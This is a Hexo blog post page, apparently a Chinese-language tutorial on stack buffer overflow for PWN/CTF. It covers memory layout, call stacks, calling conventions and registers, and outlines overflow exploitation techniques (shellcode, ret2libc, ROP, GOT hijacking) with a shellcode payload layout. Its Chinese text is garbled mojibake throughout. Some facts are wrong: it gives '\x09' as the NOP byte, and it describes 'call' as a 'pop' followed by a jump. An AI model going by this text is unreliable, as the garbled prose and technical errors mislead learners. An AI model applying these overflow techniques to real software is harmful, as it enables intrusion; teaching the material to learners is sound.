<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>PWN-ç¼“å†²åŒºæº¢å‡ºåŸç† | huzai9527&#39;s personal blog</title>
  
  

  
  <link rel="alternate" href="/atom.xml" title="huzai9527's personal blog">
  

  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <!-- meta -->
  

  <!-- link -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.6.3/css/all.min.css">
  

  
  <link rel="shortcut icon" type="image/x-icon" href="https://xaoxuu.com/assets/img/favicon.ico">
  

  
    <link rel="stylesheet" href="/style.css">
  

  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
  
</head>

<body>
  
  
  <header class="l_header material">
  <div id="loading-bar-wrapper">
    <div id="loading-bar" class="material"></div>
  </div>

	<div class="wrapper">
		<div class="nav-main container container--flex">
      <a class="logo flat-box" href="/">
        
          huzai9527's personal blog
        
      </a>
			<div class="menu navgation">
				<ul class="h-list">
          
  					
  						<li>
								<a class="nav flat-box" href="/" id="home">
									<i class="fas fa-grin fa-fw"></i>&nbsp;è¿‘æœŸæ–‡ç« 
								</a>
							</li>
      			
  						<li>
								<a class="nav flat-box" href="https://github.com/huzai9527?tab=repositories" rel="nofollow" id="https:github.comhuzai9527?tab=repositories">
									<i class="fas fa-folder-open fa-fw"></i>&nbsp;é¡¹ç›®
								</a>
							</li>
      			
  						<li>
								<a class="nav flat-box" href="/archives/" rel="nofollow" id="archives">
									<i class="fas fa-archive fa-fw"></i>&nbsp;å½’æ¡£
								</a>
							</li>
      			
  						<li>
								<a class="nav flat-box" href="https://xaoxuu.com/wiki/volantis/" rel="nofollow" id="https:xaoxuu.comwikivolantis">
									<i class="fas fa-info-circle fa-fw"></i>&nbsp;å…³äºå°ç«™
								</a>
							</li>
      			
      		
				</ul>
			</div>

			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search">
						<i class="icon fas fa-search fa-fw"></i>
					</form>
				</div>
			
			<ul class="switcher h-list">
				
					<li class="s-search"><a class="fas fa-search fa-fw" href="javascript:void(0)"></a></li>
				
				<li class="s-menu"><a class="fas fa-bars fa-fw" href="javascript:void(0)"></a></li>
			</ul>
		</div>

		<div class="nav-sub container container--flex">
			<a class="logo flat-box"></a>
			<ul class="switcher h-list">
				<li class="s-comment"><a class="flat-btn fas fa-comments fa-fw" href="javascript:void(0)"></a></li>
        
          <li class="s-toc"><a class="flat-btn fas fa-list fa-fw" href="javascript:void(0)"></a></li>
        
			</ul>
		</div>
	</div>
</header>
	<aside class="menu-phone">
    <header>
		<nav class="menu navgation">
      <ul>
        
          
            <li>
							<a class="nav flat-box" href="/" id="home">
								<i class="fas fa-clock fa-fw"></i>&nbsp;è¿‘æœŸæ–‡ç« 
							</a>
            </li>
          
            <li>
							<a class="nav flat-box" href="/categories/" rel="nofollow" id="categories">
								<i class="fas fa-archive fa-fw"></i>&nbsp;åˆ†ç±»
							</a>
            </li>
          
            <li>
							<a class="nav flat-box" href="/archives/" rel="nofollow" id="archives">
								<i class="fas fa-archive fa-fw"></i>&nbsp;å½’æ¡£
							</a>
            </li>
          
            <li>
							<a class="nav flat-box" href="/about/" rel="nofollow" id="about">
								<i class="fas fa-info-circle fa-fw"></i>&nbsp;å…³äºå°ç«™
							</a>
            </li>
          
       
      </ul>
		</nav>
    </header>
	</aside>
<script>setLoadingBarProgress(40);</script>



  <div class="l_body nocover">
    <div class='body-wrapper'>
      <div class="l_main">
  

  
    <article id="post" class="post white-box article-type-post" itemscope="" itemprop="blogPost">
      


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  
    <h1 class="title">
      <a href="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/">
        PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†
      </a>
    </h1>
  


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-12-12</p>
  </a>
</div>

          
        
          
            

          
        
          
            
  
    <div class="new-meta-item browse busuanzi">
      <a class="notlink">
        <i class="fas fa-eye" aria-hidden="true"></i>
        <p>
          <span id="busuanzi_value_page_pv">
            <i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i>
          </span>
        </p>
      </a>
    </div>
  


          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


      <section class="article typo">
        <div class="article-entry" itemprop="articleBody">
          <h2 id="ç¼“å†²åŒºæº¢å‡ºåŸç†"><a href="#ç¼“å†²åŒºæº¢å‡ºåŸç†" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºåŸç†"></a>ç¼“å†²åŒºæº¢å‡ºåŸç†</h2><h3 id="1-ç¨‹åºå†…å­˜å¸ƒå±€"><a href="#1-ç¨‹åºå†…å­˜å¸ƒå±€" class="headerlink" title="1.ç¨‹åºå†…å­˜å¸ƒå±€"></a>1.ç¨‹åºå†…å­˜å¸ƒå±€</h3><ul>
<li><p>åœ¨ç¨‹åºè¿è¡Œçš„ç”Ÿå‘½å‘¨æœŸä¸­,å†…å­˜ä¸­æ¯”è¾ƒé‡è¦çš„å››éƒ¨åˆ†æ•°æ®æ˜¯ç¨‹åºæ•°æ®ã€å †ã€åº“æ•°æ®ã€æ ˆ.æ­¤å¤–å†…æ ¸ç©ºé—´ä¹Ÿä¼šæ˜ å°„åˆ°ç¨‹åºçš„å†…å­˜ä¸­.</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116110155289.png" alt=""></p>
</li>
</ul>
<ul>
<li>ç¨‹åºæ•°æ®(Proc)<ul>
<li>ä»£ç æ®µ(Text seg)<pre><code>- ä¸»è¦å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶çš„ä»£ç æŒ‡ä»¤,æ˜¯å¯æ‰§è¡Œç¨‹åºåœ¨å†…å­˜ä¸­çš„é•œåƒ,ä»£ç æ®µä¸€èˆ¬æ˜¯åªè¯»çš„
</code></pre><ul>
<li>æ•°æ®æ®µ(Data seg)</li>
<li>å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶ä¸­å·²ç»åˆå§‹åŒ–çš„å˜é‡,åŒ…æ‹¬é™æ€åˆ†é…çš„å˜é‡å’Œå…¨å±€å˜é‡</li>
<li>BSS seg</li>
<li>åŒ…å«ç¨‹åºä¸­æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡,åœ¨å†…å­˜ä¸­bss æ®µå…¨éƒ¨ç½®0</li>
<li>å †(HEAP)</li>
<li>å­˜æ”¾è¿›ç¨‹è¿è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€ç”³è¯·çš„å†…å­˜æ®µ.è¿›ç¨‹è°ƒç”¨mallocã€allocaã€newç­‰å‡½æ•°æ¥ç”³è¯·å†…å­˜,åˆ©ç”¨freeã€deleteå‡½æ•°é‡Šæ”¾å†…å­˜.è¿™éƒ¨åˆ†å¤§å°ä¸å›ºå®š,ä»¥æ–¹ä¾¿ç¨‹åºçµæ´»ä½¿ç”¨å†…å­˜.</li>
<li>åº“æ•°æ®(Memory Mapping)</li>
<li>å­˜æ”¾æ˜ å°„çš„ç³»ç»Ÿåº“æ–‡ä»¶,å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯libcåº“,å¾ˆå¤šçš„ç¨‹åºæ‰€ä½¿ç”¨çš„ç³»ç»Ÿå‡½æ•°éƒ½ä¼šåŠ¨æ€çš„è¿æ¥åˆ°libcåº“ä¸­</li>
<li>æ ˆ(Stack)</li>
<li>æ ˆå­˜æ”¾ç¨‹åºä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡.åŒ…æ‹¬å‡½æ•°å†…éƒ¨çš„ä¸´æ—¶å˜é‡å’Œè°ƒç”¨å‡½æ•°æ—¶å‹å…¥çš„å‚æ•°.ç”±äº</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-å‡½æ•°è°ƒç”¨æ ˆ"><a href="#1-å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="1. å‡½æ•°è°ƒç”¨æ ˆ"></a>1. <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">å‡½æ•°è°ƒç”¨æ ˆ</a></h3><ul>
<li><p>æ ˆä»‹ç»</p>
<ul>
<li><p>æ ˆå†…å­˜ä¸€èˆ¬æ ¹æ®å‡½æ•°æ ˆæ¥è¿›è¡Œåˆ’åˆ†,ä¸åŒå‡½æ•°æ ˆä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„,ä»è€Œèƒ½å¤Ÿå®ç°æœ‰æ•ˆçš„å‡½æ•°åˆ‡æ¢</p>
</li>
<li><p>å‡½æ•°æ ˆä¸Šå­˜å‚¨çš„ä¿¡æ¯ä¸€èˆ¬åŒ…æ‹¬</p>
<ul>
<li><p>ä¸´æ—¶å˜é‡ (canary)</p>
</li>
<li><p>å‡½æ•°çš„è¿”å›æ ˆåŸºå€(bp)</p>
</li>
<li><p>å‡½æ•°çš„è¿”å›åœ°å€(ip)</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>å‡½æ•°æ ˆçš„è°ƒç”¨æœºåˆ¶</p>
<ul>
<li><p>ç¨‹åºè¿è¡Œæ—¶,ä¸ºäº†å®ç°å‡½æ•°ä¹‹é—´çš„ç›¸äº’éš”ç¦»,éœ€è¦åœ¨è¿›å…¥æ–°çš„å‡½æ•°ä¹‹å‰ä¿å­˜å½“å‰å‡½æ•°çš„çŠ¶æ€</p>
</li>
<li><p>å‡½æ•°è°ƒç”¨æ—¶,é¦–å…ˆå°†å‚æ•°å‹å…¥æ ˆ,ç„¶åå‹å…¥è¿”å›åœ°å€å’Œæ ˆåº•æŒ‡é’ˆå¯„å­˜å™¨bp,å…¶ä¸­å‹å…¥è¿”å›åœ°å€æ˜¯é€šè¿‡callå®ç°çš„</p>
</li>
<li><p>å‡½æ•°ç»“æŸæ—¶,å°†spé‡æ–°æŒ‡å‘bpä½ç½®,å¹¶å¼¹å‡ºbpå’Œè¿”å›åœ°å€==ip==,é€šå¸¸bpæ˜¯é€šè¿‡leaveæˆ–è€…(pop ebpå®ç°çš„)</p>
</li>
<li><p>å‡½æ•°æ ˆç¤ºæ„å›¾</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116150123844.png" alt=""></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>- åœ¨å‡½æ•°æ ˆä¸­bpå­˜å‚¨äº†ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„åŸºå€,ipå­˜å‚¨çš„æ˜¯è°ƒç”¨å¤„çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®.
- è¿”å›å½“å‰å‡½æ•°æ—¶,ä¼šä»æ ˆä¸Šå¼¹å‡ºè¿™ä¸¤ä¸ªå€¼,ä»è€Œæ¢å¤ä¸Šä¸€ä¸ªå‡½æ•°çš„ä¿¡æ¯
</code></pre><ul>
<li><p>å‡½æ•°å‚æ•°çš„ä¼ é€’</p>
<ul>
<li><p>å‡½æ•°è°ƒç”¨åè®®</p>
<ul>
<li>_stdcall: wimdows APIé»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®<ul>
<li>å‚æ•°ç”±ç”±å³å‘å·¦å…¥æ ˆ</li>
<li>è°ƒç”¨å‡½æ•°ç»“æŸåç”±è¢«è°ƒç”¨å‡½æ•°æ¥å¹³è¡¡æ ˆ</li>
</ul>
</li>
<li>_cdecl: c++/cé»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®<ul>
<li>å‚æ•°ç”±å³å‘å·¦å…¥æ ˆ</li>
<li>å‡½æ•°è°ƒç”¨ç»“æŸåç”±å‡½æ•°è°ƒç”¨è€…æ¥å¹³è¡¡æ ˆ</li>
</ul>
</li>
<li>_fastcall:é€‚ç”¨äºå¯¹æ€§èƒ½è¦æ±‚è¾ƒé«˜çš„åœºåˆ<ul>
<li>ä»å·¦å¼€å§‹å°†ä¸å¤§äº4å­—èŠ‚çš„å‚æ•°æ”¾å…¥CPUçš„ecxå’Œedxå¯„å­˜å™¨,å…¶ä½™å‚æ•°ä»å³å‘å·¦å…¥æ ˆ</li>
<li>å‡½æ•°è°ƒç”¨ç»“æŸå,ç”±è¢«è°ƒç”¨è€…æ¥å¹³è¡¡æ ˆ</li>
</ul>
</li>
</ul>
</li>
<li><p>å¯¹äºX86ç¨‹åº</p>
<ul>
<li><p>æ™®é€šå‡½æ•°ä¼ å‚:å‚æ•°åŸºæœ¬éƒ½å‹åœ¨æ ˆä¸Š(ä¹Ÿæœ‰å¯„å­˜å™¨ä¼ å‚çš„æƒ…å†µ)</p>
</li>
<li><p>syscallä¼ å‚: eaxå¯¹åº”ç³»ç»Ÿè°ƒç”¨å·,ebx,ecx,edx,esi,edi,ebpåˆ†åˆ«å¯¹åº”å‰å…­ä¸ªå‚æ•°,å¤šä½™çš„å‚æ•°å‹åœ¨æ ˆä¸Š</p>
</li>
<li><p>==å¯¹äºx86ç¨‹åºè€Œè¨€,å‚æ•°ä¼ é€’æ˜¯é€šè¿‡æ ˆæ¥å®ç°çš„,åœ¨è°ƒç”¨å®Œä»¥å,éœ€è¦æ¸…é™¤æ ˆä¸­å‚æ•°,æ‰€ä»¥ä¸€èˆ¬å‡½æ•°è°ƒç”¨å®Œä¹‹åéœ€è¦ç”¨å½¢å¦‚â€œpop;pop *;,,,,;ret;â€çš„ gadgetæ¥è°ƒæ•´.å› ä¸ºå‡½æ•°è°ƒç”¨æ—¶è¿”å›åœ°å€ä¼šå‹å…¥æ ˆä¸­,æ—¢æ±‡ç¼–ä¸­çš„â€œcall funcâ€æŒ‡ä»¤ç­‰åŒäºâ€œpop ret_addr;jump funcâ€,å› æ­¤åœ¨æ‰§è¡Œjmp funcçš„æ—¶å€™,ret_addrå·²ç»å‹å…¥æ ˆä¸­äº†==</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116160723459.png" alt=""></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>- å°†ret_addræ”¹æˆâ€pop*ï¼›retâ€œæŒ‡ä»¤çš„gadgetï¼Œç”¨æ¥å¼¹å‡ºåç»­çš„argsï¼Œå³æˆä¸ºROPçš„å½¢å¼ï¼Œè¿™ä¹Ÿæ˜¯ROPçš„åŸç†

  ![](picassets/image-20201116160738116.png)
</code></pre><ul>
<li><p>å¯¹äºX64ç¨‹åº</p>
<ul>
<li><p>æ™®é€šå‡½æ•°ä¼ å‚:å…ˆä½¿ç”¨rdi,rsi,rdx,r8,r9å¯„å­˜å™¨ä½œä¸ºå‡½æ•°å‚æ•°çš„å‰å…­ä¸ªå‚æ•°,å¤šä½™çš„å‚æ•°ä¾æ¬¡å‹åœ¨æ ˆä¸Š</p>
</li>
<li><p>syscallä¼ å‚:raxå¯¹åº”ç³»ç»Ÿè°ƒç”¨å·,ä¼ å‚è§„åˆ™å’Œæ™®é€šå‡½æ•°ä¸€æ ·</p>
</li>
<li><p>å¯¹äºX64çš„ç¨‹åºæ¥è¯´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå‡½æ•°çš„å‚æ•°è¾ƒå°‘ï¼Œé€šå¸¸ç”¨å¯„å­˜å™¨æ¥ä¼ é€’å‚æ•°ï¼Œæ‰€ä»¥åœ¨è¿›å…¥å‡½æ•°ä¹‹å‰ï¼Œå› è¯¥å…ˆå°†å¯„å­˜å™¨è®¾ç½®å¥½</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116161212714.png" alt=""></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>å‡½æ•°è¿è¡Œæ—¶å†…å­˜ä¸­çš„ä¸€æ®µè¿ç»­çš„åŒºåŸŸ,ç”¨æ¥ä¿å­˜å‡½æ•°è¿è¡Œæ—¶çš„çŠ¶æ€ä¿¡æ¯,åŒ…æ‹¬å‚æ•°ä¸å±€éƒ¨å˜é‡</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027195726522.png" alt=""></p>
</li>
</ul>
<ul>
<li><h5 id="æ¶‰åŠçš„å¯„å­˜å™¨"><a href="#æ¶‰åŠçš„å¯„å­˜å™¨" class="headerlink" title="æ¶‰åŠçš„å¯„å­˜å™¨"></a>æ¶‰åŠçš„å¯„å­˜å™¨</h5><ul>
<li><p>æ ˆå¯„å­˜å™¨</p>
<ul>
<li>esp: ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€,åœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–</li>
<li>ebp:ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€,åœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜,å¯ä»¥ç”¨æ¥ç´¢å¼•å‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®</li>
</ul>
</li>
<li><p>ç‰¹æ®Šå¯„å­˜å™¨</p>
<ul>
<li><p>eip:ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€,cpuæŒ‰ç…§eipçš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œ,eipéšä¹‹æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤,å¦‚æ­¤åå¤</p>
</li>
<li><p>Eflags:æ ‡è¯†ä½å¯„å­˜å™¨</p>
</li>
<li><p>cs(code segment):å‚¨å­˜ä»£ç æ®µçš„åœ°å€</p>
</li>
<li><p>ds(data segment):å‚¨å­˜æ•°æ®æ®µçš„åœ°å€</p>
</li>
<li><p>ss(stack segment):å‚¨å­˜å‡½æ•°è°ƒç”¨æ ˆçš„åœ°å€</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>ä¸€èˆ¬å¯„å­˜å™¨</p>
<ul>
<li>eax(Accumulate):ç´¯åŠ å¯„å­˜å™¨,ç”¨äºè¿›è¡Œç®—æ•°è¿ç®—,è¿”å›å‡½æ•°ç»“æœ</li>
<li>ebx(Base):åŸºå€å¯„å­˜å™¨,åœ¨å†…å­˜å¯»å€æ—¶(æ¯”å¦‚æ•°ç»„è¿ç®—),å­˜æ”¾åŸºåœ°å€</li>
<li>ecx(Count):è®¡æ•°å¯„å­˜å™¨,ç”¨ä»¥åœ¨å¾ªç¯ä¸­è®¡æ•°</li>
<li>edx(Data):æ•°æ®å¯„å­˜å™¨,é€šå¸¸é…åˆeaxå­˜æ”¾è¿ç®—ç»“æœç­‰æ•°æ®</li>
</ul>
</li>
<li><p>ç´¢å¼•å¯„å­˜å™¨</p>
<ul>
<li>esi(Souce Index):æŒ‡å‘è¦å¤„ç†æ•°æ®çš„åœ°å€</li>
<li>edi(Destination Index): æŒ‡å‘å­˜æ”¾æ•°æ®ç»“æœçš„åœ°å€</li>
</ul>
</li>
</ul>
<ul>
<li><p>æ¶‰åŠçš„æ±‡ç¼–æŒ‡ä»¤</p>
<ul>
<li>MOV DST,SRC; (æ•°æ®ä¼ è¾“æŒ‡ä»¤) å°†srcä¸­çš„æ•°æ®ä¼ è¾“åˆ°dstä¸­</li>
<li>PUSH SRC; (å‹å…¥å †æ ˆæŒ‡ä»¤)å°†SRCå‹å…¥æ ˆ</li>
<li>POP DST;(å¼¹å‡ºå †æ ˆæŒ‡ä»¤) å¼¹å‡ºå †æ ˆæŒ‡ä»¤,å°†æ ˆé¡¶çš„æ•°æ®å¼¹å‡ºå¹¶ä¿å­˜è‡³DST</li>
<li>LEA REG,MEM; (å–åœ°å€æŒ‡ä»¤)å°†MEMçš„åœ°å€å­˜åœ¨REGä¸­</li>
<li>ADD/SUB DST,SRC;(åŠ å‡æŒ‡ä»¤)</li>
<li>CALL PTR;(è°ƒç”¨æŒ‡ä»¤ )å°†å½“å‰çš„eipå‹å…¥æ ˆé¡¶,å¹¶å°†PTRå­˜å…¥eip</li>
<li>RET ;(è¿”å›æŒ‡ä»¤)å°†æ ˆé¡¶æ•°æ®å¼¹å‡ºè‡³eip</li>
</ul>
</li>
<li><p>è°ƒç”¨å‡½æ•°æ—¶,æ ˆçš„å˜åŒ–(å¦‚ä½•æŠ›å¼ƒè¢«è°ƒç”¨å‡½æ•°çš„çŠ¶æ€)</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201145127.png" alt=""></p>
</li>
</ul>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201543440.png" alt=""></p>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201451467.png" alt=""></p>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201645337.png" alt=""></p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201738540.png" alt=""></p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027201912962.png" alt=""></p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027202008746.png" alt=""></p>
<h3 id="2-æŠ€æœ¯æ¸…å•"><a href="#2-æŠ€æœ¯æ¸…å•" class="headerlink" title="2.æŠ€æœ¯æ¸…å•"></a>2.æŠ€æœ¯æ¸…å•</h3><ul>
<li><p>è¦†ç›–ç¼“å†²åŒºçš„å…·ä½“ç”¨é€”</p>
<ul>
<li><p>è¦†ç›–å½“å‰æ ˆä¸­å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆå½“å‰å‡½æ•°æˆ–è€…ä¹‹å‰çš„å‡½æ•°ï¼‰ï¼Œè·å–æ§åˆ¶æµ</p>
</li>
<li><p>è¦†ç›–æ ˆä¸­æ‰€å­˜å‚¨çš„ä¸´æ—¶å˜é‡</p>
</li>
<li><p>è¦†ç›–æ ˆåº•å¯„å­˜å™¨bpï¼ˆä¹‹å‰çš„å‡½æ•°ï¼‰</p>
<ul>
<li><p>è¦†ç›–bpå®ç°æ ˆè½¬ç§»</p>
<ul>
<li><p>è¿™ç§æƒ…å†µä¸»è¦é’ˆå¯¹â€œleaveï¼›retâ€æŒ‡ä»¤ï¼›è¯¥æŒ‡ä»¤ç­‰ä»·äºâ€œmov sp,bp;pop bp;retâ€</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201116162151945.png" alt=""></p>
</li>
</ul>
</li>
<li><p>è¦†ç›–bpï¼Œå®ç°å‚æ•°ç´¢å¼•æ”¹å˜</p>
<ul>
<li>ä¸€èˆ¬æ¥è¯´ï¼Œå¾ˆå¤šä¸´æ—¶å˜é‡çš„ç´¢å¼•ï¼Œéƒ½æ˜¯æ ¹æ®ç›¸å¯¹äºbpçš„åç§»é‡æ¥è¿›è¡Œçš„ï¼Œå¦‚æœbpå‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆåç»­çš„å¾ˆå¤šå‚æ•°ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–</li>
</ul>
</li>
</ul>
</li>
<li><p>å…³æ³¨æ•æ„Ÿå‡½æ•°</p>
<ul>
<li>background<ul>
<li>æ§åˆ¶æŒ‡ä»¤æ‰§è¡Œæœ€å…³é”®çš„å¯„å­˜å™¨å°±æ˜¯eip,å› æ­¤æˆ‘ä»¬çš„==<strong>ç›®æ ‡</strong>æ˜¯è®©eipè½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€==</li>
<li>å¦‚ä½•è®©eipæŒ‡å‘æ”»å‡»æŒ‡ä»¤,</li>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027202257764.png" alt=""></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>list<ul>
<li>ä¿®æ”¹è¿”å›åœ°å€,ä½¿å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤==(shellcode)==</li>
<li>ä¿®æ”¹è¿”å›åœ°å€,ä½¿å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•°==(return2libc==)</li>
<li>ä¿®æ”¹è¿”å›åœ°å€,ä½¿å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸæ®µæŒ‡ä»¤==(ROP)==</li>
<li>ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨çš„å‡½æ•°çš„åœ°å€,è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•°==(hijack GOT)==</li>
</ul>
</li>
</ul>
<h4 id="1-Shellcode-å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™"><a href="#1-Shellcode-å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™" class="headerlink" title="1.Shellcode(å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™)"></a>1.Shellcode(å…³é—­åœ°å€éšæœºåŒ–ä»¥åŠæœ‰å¯æ‰§è¡Œæƒé™)</h4><ul>
<li>payload = padding1 + address of shellcode + padding2 + shellcode</li>
<li><p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027211319900.png" alt=""></p>
</li>
<li><p>padding1 ä¸­çš„æ•°æ®éšä¾¿å¡«å……(âš ï¸å¦‚æœæ˜¯å­—ç¬¦ä¸²è¾“å…¥,é¿å…\x00,å¯èƒ½ä¼šè¢«æˆªæ–­),==é•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€==</p>
<ul>
<li>==é—®é¢˜ä¸€==:padding1å› è¯¥å¤šé•¿?<ul>
<li>å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·(GDB)æŸ¥çœ‹æ±‡ç¼–ä»£ç æ¥ç¡®å®šè¿™ä¸ªå€¼==ä¸€èˆ¬æ˜¯leaæŒ‡ä»¤+4==</li>
<li>ä¹Ÿå¯ä»¥é€šè¿‡ç¨‹åºä¸æ–­å¢åŠ è¾“å…¥é•¿åº¦æ¥è¯•æ¢(å¦‚æœè¿”å›åœ°å€è¢«æ— æ•ˆåœ°å€å¦‚â€AAAâ€œè¦†ç›–)ç¨‹åºä¼šæŠ¥é”™</li>
</ul>
</li>
</ul>
</li>
<li>address of shellcode æ˜¯åé¢shellcodeå¤„çš„èµ·å§‹å¤„çš„åœ°å€,==ç”¨æ¥è¦†ç›–è¿”å›åœ°å€==<ul>
<li>==é—®é¢˜äºŒ:==shellcode çš„èµ·å§‹åœ°å€æ˜¯å¤šå°‘?<ul>
<li>å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·æŸ¥çœ‹è¿”å›å€¼çš„åœ°å€(ebpä¸­çš„å†…å®¹+4, 32ä½æœº)</li>
<li>ä½†æ˜¯è°ƒè¯•é‡Œçš„åœ°å€å¯èƒ½å’Œæ­£å¸¸è¿è¡Œæ—¶ä¸ä¸€æ ·,æ­¤æ—¶å°±å¯ä»¥é€šè¿‡åœ¨padding2ä¸­å¡«å……è‹¥å¹²é•¿åº¦çš„==â€œ\x09â€==,æ­¤æœºå™¨ç å¯¹åº”çš„æŒ‡ä»¤æ˜¯NOP(No Operation),æ—¢å‘Šè¯‰cpuå•¥ä¹Ÿä¸ç”¨åš,ç„¶åè·³åˆ°ä¸‹ä¸€æŒ‡ä»¤,æœ‰äº†NOPçš„å¡«å……,åªè¦è¿”å›åœ°å€èƒ½å¤Ÿå‘½ä¸­è¿™ä¸€æ®µä¸­çš„ä»»ä¸€ä½ç½®,éƒ½å¯ä»¥è·³è½¬åˆ°shellcodeçš„èµ·å§‹å¤„</li>
</ul>
</li>
</ul>
</li>
<li>padding2å¯ä»¥éšæ„å¡«å……,é•¿åº¦ä»»æ„.</li>
<li>shellcodeå› è¯¥æ˜¯16è¿›åˆ¶æœºå™¨ç çš„æ ¼å¼</li>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201027213551447.png" alt=""></li>
</ul>
